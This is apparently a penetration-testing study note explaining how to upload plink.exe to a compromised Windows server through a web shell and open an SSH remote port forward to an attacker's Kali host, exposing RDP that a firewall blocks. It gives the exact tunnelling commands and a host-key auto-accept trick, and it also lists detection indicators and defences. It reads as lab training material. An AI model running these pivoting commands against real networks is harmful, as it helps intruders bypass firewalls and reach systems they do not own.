## Overview

`plink.exe` is the command-line version of PuTTY.

It can be used from a Windows shell to create SSH tunnels and port forwards, even when the Windows OpenSSH client is unavailable.

Common use case:

```text
OpenSSH client is missing from Windows
GUI access is unavailable
only command-line shell access exists
the Windows host can make outbound SSH connections
inbound access to the Windows host is blocked
```

Plink can create:

```text
local port forwards
remote port forwards
some SSH tunnel workflows similar to OpenSSH
```

Plink does **not** support:

```text
remote dynamic port forwarding
```

> [!important]  
> Plink is useful when a Windows host can SSH out to Kali and you need to expose an internal service back on your attacker machine.

---

# Why Plink Matters

Administrators may remove OpenSSH from Windows systems, but still use SSH tools for remote administration.

Before OpenSSH was common on Windows, administrators often used:

```text
PuTTY
Plink
PSCP
PSFTP
```

Plink is useful because it is:

```text
lightweight
command-line friendly
portable
common in admin workflows
capable of SSH port forwarding
usable from reverse shells and web shells
```

> [!note]  
> Plink may be less suspicious than offensive tunnelling tools, but modern EDR can still flag unusual command lines, remote forwards, or unexpected SSH connections.

# Example Scenario

## Network Layout

|Role|Host|IP|
|---|---|---|
|Attack host / SSH server|Kali|`192.168.118.4`|
|Compromised Windows host|MULTISERVER03|`192.168.50.64`|
|Internal service to access|RDP on MULTISERVER03|`127.0.0.1:3389`|
|Remote listener on Kali|Forwarded RDP port|`127.0.0.1:9833`|

Situation:

```text
Only TCP/80 is exposed on MULTISERVER03
RDP is blocked by the perimeter firewall
OpenSSH client has been removed
We have command execution through a web shell
We can get a reverse shell
We can upload Plink
MULTISERVER03 can SSH outbound to Kali
```

Goal:

```text
Use Plink on MULTISERVER03 to open a remote port on Kali.

Then connect from Kali to 127.0.0.1:9833 and reach RDP on MULTISERVER03.
```

---

# Traffic Flow

```text
Kali
192.168.118.4
SSH SERVER
Listening on 127.0.0.1:9833
    |
    | xfreerdp connects to 127.0.0.1:9833
    v
Kali sshd
    |
    | SSH tunnel established by Plink
    v
MULTISERVER03
192.168.50.64
PLINK SSH CLIENT
    |
    | Plink forwards to local RDP service
    v
MULTISERVER03
127.0.0.1:3389
RDP
```

Final application path:

```text
xfreerdp on Kali
↓
127.0.0.1:9833 on Kali
↓
SSH tunnel
↓
Plink on MULTISERVER03
↓
127.0.0.1:3389 on MULTISERVER03
```

> [!important]  
> The listener is on Kali, but the final RDP connection is made from MULTISERVER03 to its own loopback interface.

# Key Mental Model

For this command run on Windows:

```cmd
C:\Windows\Temp\plink.exe -ssh -l kali -pw <password> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
```

Remember:

```text
The command runs on Windows.
Windows is the SSH client.
Kali is the SSH server.
The listening port is created on Kali.
The final destination is reached from Windows.
```

# Plink Remote Port Forward Syntax

General syntax:

```cmd
plink.exe -ssh -l <ssh_user> -pw <ssh_password> -R <remote_bind_ip>:<remote_port>:<destination_ip>:<destination_port> <ssh_server_ip>
```

Example:

```cmd
C:\Windows\Temp\plink.exe -ssh -l kali -pw <password> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
```

Breakdown:

|Component|Meaning|
|---|---|
|`C:\Windows\Temp\plink.exe`|Plink executable on Windows|
|`-ssh`|Use SSH mode|
|`-l kali`|SSH username on Kali|
|`-pw <password>`|SSH password for Kali|
|`-R`|Create a remote port forward|
|`127.0.0.1:9833`|Listener created on Kali|
|`127.0.0.1:3389`|Destination reached from Windows|
|`192.168.118.4`|Kali SSH server IP|

# Understanding the IP Addresses

## `192.168.118.4`

This is Kali.

It is:

```text
the SSH server
the attacker-controlled host
the host receiving the Plink connection
```

Plink connects outbound to:

```text
192.168.118.4:22
```

---

## `192.168.50.64`

This is MULTISERVER03.

It is:

```text
the compromised Windows host
the system running plink.exe
the SSH client
the system that can access local RDP
```

---

## First `127.0.0.1:9833`

In the `-R` rule:

```text
127.0.0.1:9833
```

means:

```text
Bind port 9833 on Kali's loopback interface.
```

Kali connects to:

```text
127.0.0.1:9833
```

---

## Second `127.0.0.1:3389`

In the `-R` rule:

```text
127.0.0.1:3389
```

means:

```text
Forward traffic to RDP on MULTISERVER03 loopback.
```

This is evaluated from the Windows host’s perspective because Windows is the SSH client.

# 8. Create the Plink Remote Port Forward

Run from the Windows reverse shell:

```cmd
C:\Windows\Temp\plink.exe -ssh -l kali -pw <password> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
```

This creates:

```text
Kali listener:
127.0.0.1:9833

Forward destination from Windows:
127.0.0.1:3389
```

Meaning:

```text
Any connection to 127.0.0.1:9833 on Kali is tunnelled to RDP on MULTISERVER03.
```

---

# Password Warning

Passing a password with `-pw` may expose it in:

```text
command history
process listings
EDR telemetry
PowerShell logs
terminal scrollback
shell transcripts
```

Safer options:

```text
create a dedicated low-privilege SSH user for forwarding
use key-based authentication
limit shell access for the forwarding user
restrict allowed forwarding destinations
remove credentials after use
```

> [!warning]  
> Do not reuse your primary Kali password in a hostile environment if it may appear in command-line logs.

# 9. Handling the Plink Host Key Prompt

First connection may ask:

```text
Store key in cache? (y/n, Return cancels connection)
```

In an interactive shell, type:

```text
y
```

In a limited shell, pipe `y` into Plink:

```cmd
cmd.exe /c echo y | C:\Windows\Temp\plink.exe -ssh -l kali -pw <password> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
```

This automatically accepts the SSH host key prompt.

> [!note]  
> Accept host keys only when you are confident the SSH server is the intended host.

# Using Key-Based Authentication

Password-based Plink command lines can expose credentials.

A better approach is to use a private key:

```cmd
plink.exe -ssh -i C:\Windows\Temp\key.ppk -l <ssh_user> -R 127.0.0.1:9833:127.0.0.1:3389 <kali_ip>
```

Notes:

```text
Plink expects PuTTY .ppk private keys
OpenSSH keys may need conversion with puttygen
remove temporary keys during cleanup
```

# Security and Detection Notes

Potential indicators:

```text
plink.exe written to C:\Windows\Temp
nc.exe written to C:\Windows\Temp
web application spawning powershell.exe
web application spawning nc.exe
outbound SSH from IIS worker context
plink.exe command line containing -R
Kali sshd listening on forwarded loopback port
RDP accessed through local forwarded port
credentials passed on Plink command line
```

Defensive controls:

```text
restrict outbound SSH from servers
monitor Plink and PuTTY execution
alert on plink.exe with -R or -L
monitor web service child processes
block unapproved binaries in Temp
enable PowerShell logging
restrict remote forwarding on SSH servers
use application allowlisting
monitor suspicious RDP through tunnels
```

Suspicious command line:

```cmd
plink.exe -ssh -l kali -pw <password> -R 127.0.0.1:9833:127.0.0.1:3389 <kali_ip>
```

# Decision Guide

Use Plink when:

```text
OpenSSH client is unavailable
you have command-line access to Windows
you can upload binaries
the Windows host can SSH outbound
you need fixed remote port forwarding
```

Use Windows OpenSSH when:

```text
ssh.exe is installed
remote dynamic forwarding is needed
you want SOCKS-style pivoting
OpenSSH client is version 7.6 or newer
```

Use other tools when:

```text
Plink is blocked
outbound SSH is blocked
SOCKS pivoting is required
credentials cannot be safely passed
EDR detects Plink
```

Alternatives:

```text
OpenSSH ssh.exe
chisel
ligolo-ng
socat
netsh portproxy
PowerShell tunnelling tools
RDP over existing C2 channel
```

# Key Takeaways

- Plink is PuTTY’s command-line SSH client.
    
- Plink is useful when Windows OpenSSH is missing.
    
- Plink can perform remote port forwarding with `-R`.
    
- Plink does not support remote dynamic port forwarding.
    
- The Plink command runs on the Windows host.
    
- Kali is the SSH server.
    
- The remote listener is created on Kali.
    
- The final destination is reached from the Windows host.
    
- `127.0.0.1:9833` in the example is Kali’s listener.
    
- `127.0.0.1:3389` in the example is RDP on MULTISERVER03.
    
- Piping `echo y` can handle Plink’s first-time host key prompt.
    
- Passing passwords with `-pw` can expose credentials.
    
- Use a dedicated forwarding account or key-based authentication where possible.
    
- Clean up `nc.exe`, `plink.exe`, temporary keys, and SSH server changes.
